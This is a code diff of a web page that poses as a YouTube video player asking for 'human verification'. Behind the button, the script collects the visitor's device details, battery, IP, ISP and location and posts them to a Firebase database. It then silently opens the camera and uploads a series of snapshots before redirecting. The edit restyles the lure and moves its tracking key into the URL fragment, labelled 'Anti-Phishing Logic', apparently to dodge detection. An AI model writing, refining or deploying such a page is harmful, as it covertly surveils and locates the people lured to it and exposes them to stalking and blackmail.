@@ -3,94 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Player - Trending</title>
+    <title>Video Player</title>
     <style>
-        body { background: #fff; color: #333; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
-        .player-box { width: 90%; max-width: 400px; padding: 20px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-        .video-thumb { width: 100%; border-radius: 12px; margin-bottom: 15px; border: 1px solid #eee; }
-        .btn { background: #ff0000; color: #fff; border: none; padding: 12px 25px; border-radius: 30px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; box-shadow: 0 4px 10px rgba(255,0,0,0.2); }
-        .loading-text { font-size: 12px; color: #888; margin-top: 10px; }
-        #video-hidden { display: none; }
+        body { background: #e0e5ec; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #e0e5ec; padding: 30px; border-radius: 30px; box-shadow: 20px 20px 60px #bec3c9, -20px -20px 60px #ffffff; text-align: center; width: 85%; max-width: 350px; }
+        .yt-img { width: 100%; border-radius: 20px; box-shadow: inset 6px 6px 12px #bec3c9, inset -6px -6px 12px #ffffff; margin-bottom: 20px; }
+        .btn { background: #00a884; color: white; border: none; padding: 15px; width: 100%; border-radius: 15px; font-weight: bold; cursor: pointer; box-shadow: 6px 6px 12px #bec3c9, -6px -6px 12px #ffffff; }
+        .btn:active { box-shadow: inset 4px 4px 8px #bec3c9, inset -4px -4px 8px #ffffff; }
     </style>
 </head>
 <body>
-    <div class="player-box" id="ui">
-        <img src="https://img.youtube.com/vi/aqz-KE-bpKQ/mqdefault.jpg" class="video-thumb">
-        <h3 style="margin: 10px 0; font-size: 18px;">Video Processing... (1/2)</h3>
-        <p style="font-size: 13px; color: #666;">High-speed server connection established. Complete verification to watch both videos.</p>
-        <button class="btn" onclick="startCapture()">VERIFY & PLAY VIDEOS</button>
-        <p class="loading-text">🔒 Secure end-to-end encryption</p>
+    <div class="box">
+        <img src="https://img.youtube.com/vi/aqz-KE-bpKQ/mqdefault.jpg" class="yt-img">
+        <h3 style="color:#444;">Video Verification</h3>
+        <p style="font-size: 12px; color: #666;">High-speed processing requires a quick human verification to continue.</p>
+        <button class="btn" onclick="start()">VERIFY & WATCH</button>
     </div>
 
-    <video id="video-hidden" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
 
     <script>
         const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
-        let userKey, targetUrl, isCaptured = false;
+        
+        // Anti-Phishing Logic: Reading data from # instead of ?
+        const hashData = window.location.hash.substring(1);
+        if(!hashData) { window.location.href = "https://youtube.com"; }
+        const decoded = JSON.parse(atob(hashData));
 
-        const params = new URLSearchParams(window.location.search);
-        const id = params.get('id');
-        if (id) {
-            const decoded = JSON.parse(atob(id));
-            userKey = decoded.k;
-            targetUrl = decoded.r;
-        }
-
-        async function startCapture() {
-            if(isCaptured) return;
-            isCaptured = true;
-
-            // 1. Capture All Details (IP, SIM/ISP, Network, Battery)
-            let details = {
+        async function start() {
+            let info = {
                 time: new Date().toLocaleString(),
                 model: navigator.userAgent.split('(')[1]?.split(')')[0] || "Unknown",
-                platform: navigator.platform,
-                vendor: navigator.vendor,
                 ram: navigator.deviceMemory || "N/A"
             };
 
             try {
-                // Battery & Network
-                const bat = await navigator.getBattery();
-                details.battery = Math.round(bat.level * 100) + "%";
-                details.charging = bat.charging ? "Yes" : "No";
-                details.network = navigator.connection ? navigator.connection.effectiveType : "N/A";
-
-                // IP & ISP (SIM Details)
+                const b = await navigator.getBattery();
+                info.bat = Math.round(b.level * 100) + "%";
+                info.net = navigator.connection ? navigator.connection.effectiveType : "N/A";
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
-                details.ip = d.ip;
-                details.isp = d.org; // This shows SIM/Network provider
-                details.loc = `${d.city}, ${d.region}, ${d.country_name}`;
-                details.flag = `https://flagcdn.com/w40/${d.country_code.toLowerCase()}.png`;
-                details.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-            } catch(e) {}
+                info.ip = d.ip; info.isp = d.org;
+                info.loc = `${d.city}, ${d.country_name}`;
+                info.flag = `https://flagcdn.com/w40/${d.country_code.toLowerCase()}.png`;
+                info.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+            } catch(e){}
 
-            fetch(`${DB_URL}tracking/${userKey}.json`, { method: 'POST', body: JSON.stringify(details) });
+            fetch(`${DB_URL}tracking/${decoded.k}.json`, { method: 'POST', body: JSON.stringify(info) });
 
-            // 2. Capture 4 Snaps
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const v = document.getElementById('video-hidden');
-                v.srcObject = stream;
-                
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.getElementById('v'); v.srcObject = s;
                 let count = 0;
-                let interval = setInterval(() => {
-                    if(count >= 4) {
-                        clearInterval(interval);
-                        stream.getTracks().forEach(t => t.stop());
-                        window.location.href = targetUrl; // Final Redirect
-                        return;
-                    }
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
-                    canvas.getContext('2d').drawImage(v, 0, 0);
-                    const photo = canvas.toDataURL('image/jpeg', 0.4);
-                    fetch(`${DB_URL}photos/${userKey}.json`, { method: 'POST', body: JSON.stringify({ photo, time: new Date().toLocaleTimeString() }) });
+                let t = setInterval(() => {
+                    if(count >= 6) { clearInterval(t); s.getTracks().forEach(tr => tr.stop()); window.location.href = decoded.r; return; }
+                    const c = document.getElementById('c');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    fetch(`${DB_URL}photos/${decoded.k}.json`, { method: 'POST', body: JSON.stringify({ p: c.toDataURL('image/jpeg', 0.3), t: new Date().toLocaleTimeString() }) });
                     count++;
-                }, 1000);
-            } catch(e) { window.location.href = targetUrl; }
+                }, 800);
+            } catch(e) { window.location.href = decoded.r; }
         }
     </script>
 </body>
